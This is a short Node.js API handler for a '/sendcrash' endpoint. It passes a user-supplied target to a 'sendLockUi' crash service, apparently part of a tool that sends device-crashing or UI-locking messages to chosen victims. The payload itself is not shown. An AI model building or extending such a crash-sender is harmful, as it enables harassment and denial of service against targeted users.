//api by Aorta
const sendLockUi = require('../services/sendcrashService');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { target, ptcp } = req.body;

    if (!target) {
        return res.status(400).json({ error: 'Target is required' });
    }

    try {
        console.log(`Request received at /sendcrash endpoint with target: ${target}`);
        await sendLockUi(target, ptcp);
        res.status(200).json({ message: 'Message sent successfully' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to send message', details: error.message });
    }
};